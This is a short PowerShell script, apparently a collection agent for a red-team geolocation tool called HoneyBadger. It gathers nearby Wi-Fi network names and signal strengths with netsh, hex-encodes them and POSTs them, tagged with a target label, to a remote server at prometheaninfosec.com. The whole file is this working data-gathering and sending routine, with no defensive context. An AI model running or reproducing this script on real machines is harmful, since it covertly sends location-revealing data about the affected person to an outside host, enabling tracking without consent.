$HONEYBADGER = "https://prometheaninfosec.com/honeybadger-red/service.php"
$TARGET = "My Target"

function hexEncode ($Text)
{
$tmp = [System.Text.Encoding]::UTF8.GetBytes($Text)
$tmp = [System.BitConverter]::ToString($tmp)
$tmp -replace "-",""
}

function toBase64 ($Text)
{
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
}

Function Base64Encode($textIn) 
{
    $b  = [System.Text.Encoding]::UTF8.GetBytes($textIn)
    $encoded = [System.Convert]::ToBase64String($b)
    return $encoded    
}


$tmp = cmd.exe /c netsh wlan show networks mode=bssid | findstr "SSID Signal"
$tmp = $tmp -replace "\s+"," "
$tmp = hexEncode $tmp
$tmp

$postMe = @{decode='hex';target=$TARGET;agent='powershell';os='windows';data=$tmp}
Invoke-WebRequest -Uri $HONEYBADGER -Method POST -Body $postMe
